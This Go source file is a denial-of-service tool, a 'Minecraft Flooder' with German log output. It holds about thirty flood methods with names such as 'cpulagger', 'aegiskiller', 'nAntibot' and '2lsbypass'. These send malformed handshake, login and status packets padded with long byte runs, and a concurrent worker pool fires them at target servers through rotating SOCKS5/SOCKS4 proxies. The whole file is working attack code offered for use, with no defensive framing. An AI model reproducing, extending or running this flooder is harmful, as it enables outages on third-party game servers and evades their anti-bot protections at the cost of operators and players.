package main

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

type MinecraftFlooder struct {
	servers        []string
	proxies        []ProxyConfig
	useRotating    bool
	concurrency    int
	requestsPerSec int
	duration       time.Duration
	floodType      string

	currentProxyIdx int64
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	avgResponseTime int64

	serverStats map[string]*ServerStats
	errorStats  map[string]int64
	statsMutex  sync.RWMutex
	flooders    map[string]FlooderFunc
}

type ServerStats struct {
	TotalPings   int64
	SuccessPings int64
	TotalLatency time.Duration
}

type FloodRequest struct {
	Server      string
	ProxyConfig ProxyConfig
	FloodType   string
}

type FlooderFunc func(conn net.Conn, host string, port int) error

const LOOP_AMOUNT = 1900

func NewMinecraftFlooder(servers []string, proxies []ProxyConfig, useRotating bool, concurrency int, requestsPerSec int, duration time.Duration, floodType string) *MinecraftFlooder {
	mf := &MinecraftFlooder{
		servers:        servers,
		proxies:        proxies,
		useRotating:    useRotating,
		concurrency:    concurrency,
		requestsPerSec: requestsPerSec,
		duration:       duration,
		floodType:      floodType,
		serverStats:    make(map[string]*ServerStats),
		errorStats:     make(map[string]int64),
		flooders:       make(map[string]FlooderFunc),
	}

	mf.initFlooders()
	return mf
}

func (mf *MinecraftFlooder) initFlooders() {
	mf.flooders["localhost"] = func(conn net.Conn, host string, port int) error {
		data := []byte{15, 0, 47, 9}
		data = append(data, []byte("localhost")...)
		data = append(data, 99, 224, 1)
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 1, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["namenullping"] = func(conn net.Conn, host string, port int) error {
		cipher := randomString(12)

		data := []byte{15, 0, 47, 9}
		data = append(data, []byte("host")...)
		data = append(data, 99, 223, 2)
		data = append(data, byte(len(cipher)+2), 0, byte(len(cipher)))
		data = append(data, []byte(cipher)...)

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["bosshandler"] = func(conn net.Conn, host string, port int) error {
		data := []byte{0, 17, 19, 21, 0, 241, 239, 237, 235, 1, 1, 0, 1, 0, 1}
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["fakepremium_join"] = func(conn net.Conn, host string, port int) error {
		nick := randomString(14)
		data := []byte{byte(len(nick) + 2), 0, byte(len(nick))}
		data = append(data, []byte(nick)...)
		data = append(data, 1, 248, 251, 248, 251, 2, 1)
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["botnullping"] = func(conn net.Conn, host string, port int) error {
		data := []byte{15, 0, 47, 9}
		data = append(data, []byte("localhost")...)
		data = append(data, 99, 223)

		nick := randomString(14) + "_Paola"
		data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
		data = append(data, []byte(nick)...)
		data = append(data, 185)

		for i := 0; i < 1900; i++ {
			data = append(data, 1, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["ultrajoin"] = func(conn net.Conn, host string, port int) error {
		seconds := time.Now().Unix()
		var data []byte

		if seconds%2 > 0 {
			data = getMotdPreparedBytes()
		} else {
			data = getLoginPreparedBytes()
		}

		data = append(data, 0, 47, 9)
		data = append(data, []byte("localhost")...)
		data = append(data, 99, 223, 2)

		nick := randomString(3) + "_" + randomString(6)
		data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
		data = append(data, []byte(nick)...)

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["fakejoin"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		nick := randomString(10)
		data = append(data, []byte(nick)...)
		data = append(data, 1, 248, 251, 248, 251, 2, 1, 1)
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["fastjoin"] = func(conn net.Conn, host string, port int) error {
		data := []byte{15, 0, 47, 9}
		data = append(data, []byte("localhost")...)
		data = append(data, 99, 223, 2)

		nick := randomString(1)
		data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
		data = append(data, []byte(nick)...)

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["2lsbypass"] = func(conn net.Conn, host string, port int) error {
		seconds := time.Now().Unix()
		var data []byte

		if seconds%2 > 0 {
			data = getMotdPreparedBytes()
		} else {
			data = getLoginPreparedBytes()
			nick := randomString(3) + "_" + randomString(9)
			data = append(data, []byte(nick)...)
		}

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["multikiller"] = func(conn net.Conn, host string, port int) error {
		seconds := time.Now().Unix()
		var data []byte

		if seconds%2 > 0 {
			data = getMotdPreparedBytes()
		} else if seconds%3 > 0 {
			data = getLoginPreparedBytes()
			nick := randomString(3) + "_" + randomString(9)
			data = append(data, []byte(nick)...)
			data = append(data, 1, 248, 251, 248, 251, 2, 1, 1)
		} else if seconds%4 > 0 {
			data = getLoginPreparedBytes()
			nick := randomString(10)
			data = append(data, []byte(nick)...)
			uuid := randomString(22)
			data = append(data, byte(len(uuid)+len(nick)+3), 2, byte(len(uuid)))
			data = append(data, []byte(uuid)...)
			data = append(data, byte(len(nick)))
			data = append(data, []byte(nick)...)
		} else {
			data = []byte{15, 0, 47, 9}
			data = append(data, []byte("localhost")...)
			data = append(data, 99, 223, 2)
			nick := randomString(14)
			data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
			data = append(data, []byte(nick)...)
		}

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["aegiskiller"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		nick := randomString(10)
		data = append(data, []byte(nick)...)
		uuid := randomString(22)
		data = append(data, byte(len(uuid)+len(nick)+3), 2, byte(len(uuid)))
		data = append(data, []byte(uuid)...)
		data = append(data, byte(len(nick)))
		data = append(data, []byte(nick)...)

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["cpulagger"] = func(conn net.Conn, host string, port int) error {
		data := []byte{0, 17, 19, 21, 0, 241, 239, 237, 235, 1, 1, 0, 1, 0, 1}
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["byte"] = func(conn net.Conn, host string, port int) error {
		data := []byte{8, 248, 252, 248, 8}
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 8, 248)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["destroyer"] = func(conn net.Conn, host string, port int) error {
		data := []byte{0, 80}
		data = append(data, 192, 192)
		data = append(data, 176, 192)
		data = append(data, 176, 192)
		data = append(data, 78, 32)

		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 78, 176)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["IDERROR"] = func(conn net.Conn, host string, port int) error {
		data := []byte{6, 250, 241, 240, 6}
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 6, 250)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["fakehost"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		nick := randomString(3) + "_" + randomString(6)
		data = append(data, []byte(nick)...)

		fakehost := randomString(255)
		data = append(data, byte(len(fakehost)))
		data = append(data, []byte(fakehost)...)
		data = append(data, 99, 223, 2)
		data = append(data, []byte(fakehost)...)
		data = append(data, byte(len(fakehost)+2), 0, byte(len(fakehost)))

		_, err := conn.Write(data)
		return err
	}

	mf.flooders["proauthkiller"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		nick := randomString(3) + "_" + randomString(6)
		data = append(data, []byte(nick)...)
		data = append(data, 0, byte(len(nick)))
		data = append(data, []byte(nick)...)
		data = append(data, 1, 248, 251, 248, 251, 2, 1, 1)
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["motdkiller"] = func(conn net.Conn, host string, port int) error {
		data := getMotdPreparedBytes()
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["legacy_motd"] = func(conn net.Conn, host string, port int) error {
		data := getLegacyMotdPreparedBytes()
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["joinbots"] = func(conn net.Conn, host string, port int) error {
		nick := randomString(14)
		data := []byte{byte(len(nick) + 2), 0, byte(len(nick))}
		data = append(data, []byte(nick)...)
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["botfucker"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		nick := randomString(3) + "_" + randomString(6)
		data = append(data, []byte(nick)...)
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["consola"] = func(conn net.Conn, host string, port int) error {
		message := "Hello" + strconv.Itoa(rand.Intn(100))
		data := []byte(message)
		data = append(data, 15, 0, 47, 9)
		data = append(data, []byte("localhost")...)
		data = append(data, 99, 224, 1)
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 1, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["paola"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		data = append(data, getLoginPreparedBytes()...)
		data = append(data, getLoginPreparedBytes()...)
		data = append(data, getLoginPreparedBytes()...)
		data = append(data, getLoginPreparedBytes()...)
		nick := randomString(3) + "_" + randomString(6)
		data = append(data, []byte(nick)...)
		data = append(data, []byte(randomString(9))...)
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["nAntibot"] = func(conn net.Conn, host string, port int) error {
		data := getLoginPreparedBytes()
		nick := randomString(10)
		data = append(data, []byte(nick)...)
		data = append(data, []byte(randomString(8))...)

		for i := 0; i < 10; i++ {
			data = append(data, 174, 174, 174, 174, 174, 174, 174, 174, 174, 174, 174)
		}

		for i := 1; i < LOOP_AMOUNT; i++ {
			data = append(data, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["TimeOutKiller"] = func(conn net.Conn, host string, port int) error {
		data := []byte{23, 200, 12, 52}
		data = append(data, []byte(host)...)
		data = append(data, 111, 1)
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 1, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["cpuburner6"] = func(conn net.Conn, host string, port int) error {
		data := []byte{0, 47, 13, 52, 53, 46, 56, 57, 46, 49, 52, 49, 46, 49, 52, 54, 99, 221}
		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 1, 0)
		}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["cpuRipper"] = func(conn net.Conn, host string, port int) error {
		data := []byte{3, 1, 0, 187, 1, 0, 0, 183, 3, 3, 203, 130, 174, 83, 21, 246, 121, 2, 194, 11, 225, 194, 106, 248, 117, 233, 50, 35, 60, 57, 3, 63, 164, 199, 181, 136, 80, 31, 46, 101, 33, 0, 0, 72, 0, 47}
		_, err := conn.Write(data)
		return err
	}

	mf.flooders["flood"] = func(conn net.Conn, host string, port int) error {
		data := []byte{0, 47, 20, 109}
		data = append(data, []byte(host)...)
		data = append(data, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, 221, 2)

		for i := 0; i < LOOP_AMOUNT; i++ {
			data = append(data, 1, 0)
		}
		_, err := conn.Write(data)
		return err
	}
}

func (mf *MinecraftFlooder) Start() {
	log := NewLogger(false, true)
	log.Info("Starte Minecraft Server Flooder")
	log.Infof("Server: %d, Worker: %d, Flood-Type: %s, Requests/s: %d, Dauer: %v",
		len(mf.servers), mf.concurrency, mf.floodType, mf.requestsPerSec, mf.duration)
	log.Infof("Verfügbare Proxys: %d (Rotation: %v)", len(mf.proxies), mf.useRotating)

	ctx, cancel := context.WithTimeout(context.Background(), mf.duration)
	defer cancel()

	floodInterval := time.Second / time.Duration(mf.requestsPerSec)
	channelSize := mf.concurrency * 5
	requestChan := make(chan FloodRequest, channelSize)

	var wg sync.WaitGroup

	for i := 0; i < mf.concurrency; i++ {
		wg.Add(1)
		go mf.worker(ctx, &wg, requestChan, i, log)
	}

	go func() {
		defer close(requestChan)
		ticker := time.NewTicker(floodInterval)
		defer ticker.Stop()

		serverIdx := 0
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				proxy := mf.getNextProxy()
				server := mf.servers[serverIdx%len(mf.servers)]
				serverIdx++

				request := FloodRequest{
					Server:      server,
					ProxyConfig: proxy,
					FloodType:   mf.floodType,
				}

				select {
				case requestChan <- request:
				case <-ctx.Done():
					return
				default:
				}
			}
		}
	}()

	statsTicker := time.NewTicker(time.Second)
	defer statsTicker.Stop()
	go mf.printLiveStats(ctx, statsTicker.C)

	wg.Wait()
	mf.printFinalStats()
}

func (mf *MinecraftFlooder) worker(ctx context.Context, wg *sync.WaitGroup, requestChan <-chan FloodRequest, workerID int, log *Logger) {
	defer wg.Done()
	log.Debugf("Flooder Worker %d gestartet", workerID)

	for {
		select {
		case <-ctx.Done():
			return
		case request, ok := <-requestChan:
			if !ok {
				return
			}
			mf.performFlood(ctx, request, workerID, log)
		}
	}
}

func (mf *MinecraftFlooder) performFlood(ctx context.Context, request FloodRequest, workerID int, log *Logger) {
	atomic.AddInt64(&mf.totalRequests, 1)

	start := time.Now()
	err := mf.floodMinecraftServer(ctx, request.Server, request.ProxyConfig, request.FloodType, log)
	latency := time.Since(start)

	atomic.AddInt64(&mf.avgResponseTime, latency.Milliseconds())

	success := err == nil
	if success {
		atomic.AddInt64(&mf.successRequests, 1)
	} else {
		atomic.AddInt64(&mf.failedRequests, 1)
		mf.trackError(err.Error())
	}

	mf.updateServerStats(request.Server, success, latency)
}

func (mf *MinecraftFlooder) floodMinecraftServer(ctx context.Context, server string, proxyConfig ProxyConfig, floodType string, log *Logger) error {
	target, portStr, err := mf.parseServer(server)
	if err != nil {
		return err
	}

	port, _ := strconv.Atoi(portStr)
	fullTarget := net.JoinHostPort(target, portStr)

	conn, err := mf.establishConnection(ctx, fullTarget, proxyConfig, log)
	if err != nil {
		return fmt.Errorf("verbindung fehlgeschlagen: %w", err)
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	flooder, exists := mf.flooders[floodType]
	if !exists {
		return fmt.Errorf("unbekannter Flood-Typ: %s", floodType)
	}

	return flooder(conn, target, port)
}

func (mf *MinecraftFlooder) establishConnection(ctx context.Context, target string, proxyConfig ProxyConfig, log *Logger) (net.Conn, error) {
	if proxyConfig.Host == "" {
		var d net.Dialer
		d.Timeout = 10 * time.Second
		return d.DialContext(ctx, "tcp", target)
	}

	switch proxyConfig.Protocol {
	case "socks5":
		return mf.connectViaSocks5(ctx, target, proxyConfig, log)
	case "socks4":
		return mf.connectViaSocks4(ctx, target, proxyConfig, log)
	default:
		return nil, fmt.Errorf("nicht unterstütztes Proxy-Protokoll: %s", proxyConfig.Protocol)
	}
}

func (mf *MinecraftFlooder) connectViaSocks5(ctx context.Context, target string, proxyConfig ProxyConfig, log *Logger) (net.Conn, error) {
	var auth *proxy.Auth
	if proxyConfig.Username != "" {
		auth = &proxy.Auth{
			User:     proxyConfig.Username,
			Password: proxyConfig.Password,
		}
	}

	proxyAddr := net.JoinHostPort(proxyConfig.Host, proxyConfig.Port)
	dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("SOCKS5-Dialer-Fehler: %w", err)
	}

	return mf.dialWithContext(ctx, dialer, "tcp", target)
}

func (mf *MinecraftFlooder) connectViaSocks4(ctx context.Context, target string, proxyConfig ProxyConfig, log *Logger) (net.Conn, error) {
	proxyAddr := net.JoinHostPort(proxyConfig.Host, proxyConfig.Port)
	dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("SOCKS4-Dialer-Fehler: %w", err)
	}

	return mf.dialWithContext(ctx, dialer, "tcp", target)
}

func (mf *MinecraftFlooder) dialWithContext(ctx context.Context, dialer proxy.Dialer, network, address string) (net.Conn, error) {
	type result struct {
		conn net.Conn
		err  error
	}

	ch := make(chan result, 1)

	go func() {
		defer close(ch)
		conn, err := dialer.Dial(network, address)
		select {
		case ch <- result{conn, err}:
		case <-ctx.Done():
			if conn != nil {
				conn.Close()
			}
		}
	}()

	select {
	case res := <-ch:
		return res.conn, res.err
	case <-ctx.Done():
		return nil, fmt.Errorf("verbindungs-timeout: %w", ctx.Err())
	}
}

func (mf *MinecraftFlooder) parseServer(server string) (string, string, error) {
	if strings.Contains(server, ":") {
		host, port, err := net.SplitHostPort(server)
		if err != nil {
			return "", "", err
		}
		return host, port, nil
	}
	return server, "25565", nil
}

func (mf *MinecraftFlooder) getNextProxy() ProxyConfig {
	if len(mf.proxies) == 0 {
		return ProxyConfig{}
	}

	if mf.useRotating {
		idx := atomic.AddInt64(&mf.currentProxyIdx, 1) - 1
		return mf.proxies[idx%int64(len(mf.proxies))]
	}

	return mf.proxies[0]
}

func (mf *MinecraftFlooder) updateServerStats(server string, success bool, latency time.Duration) {
	mf.statsMutex.Lock()
	defer mf.statsMutex.Unlock()

	if mf.serverStats[server] == nil {
		mf.serverStats[server] = &ServerStats{}
	}

	stats := mf.serverStats[server]
	atomic.AddInt64(&stats.TotalPings, 1)
	if success {
		atomic.AddInt64(&stats.SuccessPings, 1)
	}
	stats.TotalLatency += latency
}

func (mf *MinecraftFlooder) trackError(errorType string) {
	mf.statsMutex.Lock()
	defer mf.statsMutex.Unlock()
	mf.errorStats[errorType]++
}

func (mf *MinecraftFlooder) printLiveStats(ctx context.Context, ticker <-chan time.Time) {
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker:
			total := atomic.LoadInt64(&mf.totalRequests)
			success := atomic.LoadInt64(&mf.successRequests)
			failed := atomic.LoadInt64(&mf.failedRequests)

			if total > 0 {
				successRate := float64(success) / float64(total) * 100
				fmt.Printf("\rFloods: %d | Erfolg: %d (%.1f%%) | Fehler: %d | Typ: %s",
					total, success, successRate, failed, mf.floodType)
			}
		}
	}
}

func (mf *MinecraftFlooder) printFinalStats() {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("MINECRAFT FLOODER - FINALE STATISTIKEN")
	fmt.Println(strings.Repeat("=", 60))

	total := atomic.LoadInt64(&mf.totalRequests)
	success := atomic.LoadInt64(&mf.successRequests)
	failed := atomic.LoadInt64(&mf.failedRequests)
	avgRT := atomic.LoadInt64(&mf.avgResponseTime)

	if total > 0 {
		successRate := float64(success) / float64(total) * 100
		fmt.Printf("Gesamt Floods: %d\n", total)
		fmt.Printf("Erfolgreiche Floods: %d (%.2f%%)\n", success, successRate)
		fmt.Printf("Fehlgeschlagene Floods: %d (%.2f%%)\n", failed, 100-successRate)
		fmt.Printf("Floods/Sekunde: %.2f\n", float64(total)/mf.duration.Seconds())
		fmt.Printf("Durchschnittliche Antwortzeit: %dms\n", avgRT/total)
		fmt.Printf("Flood-Typ: %s\n", mf.floodType)
	}

	fmt.Println(strings.Repeat("=", 60))
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func getLoginPreparedBytes() []byte {
	return []byte{0x00, 0x2F, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x63, 0xDD, 0x02}
}

func getMotdPreparedBytes() []byte {
	return []byte{0x0F, 0x00, 0x2F, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x63, 0xDD, 0x01, 0x01, 0x00}
}

func getLegacyMotdPreparedBytes() []byte {
	return []byte{0xFE, 0x01, 0xFA, 0x00, 0x0B, 0x00, 0x4D, 0x00, 0x43, 0x00, 0x7C, 0x00, 0x50, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x48, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74}
}

type Logger struct {
	debugMode   bool
	verboseMode bool
}

func NewLogger(debug, verbose bool) *Logger {
	return &Logger{
		debugMode:   debug,
		verboseMode: verbose,
	}
}

func (l *Logger) Info(msg string) {
	fmt.Printf("[INFO %s] %s\n", time.Now().Format("15:04:05.000"), msg)
}

func (l *Logger) Infof(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	l.Info(msg)
}

func (l *Logger) Debug(msg string) {
	if l.debugMode {
		fmt.Printf("[DEBUG %s] %s\n", time.Now().Format("15:04:05.000"), msg)
	}
}

func (l *Logger) Debugf(format string, args ...interface{}) {
	if l.debugMode {
		msg := fmt.Sprintf(format, args...)
		l.Debug(msg)
	}
}

func (l *Logger) Verbose(msg string) {
	if l.verboseMode {
		fmt.Printf("[VERBOSE %s] %s\n", time.Now().Format("15:04:05.000"), msg)
	}
}

func (l *Logger) Verbosef(format string, args ...interface{}) {
	if l.verboseMode {
		msg := fmt.Sprintf(format, args...)
		l.Verbose(msg)
	}
}
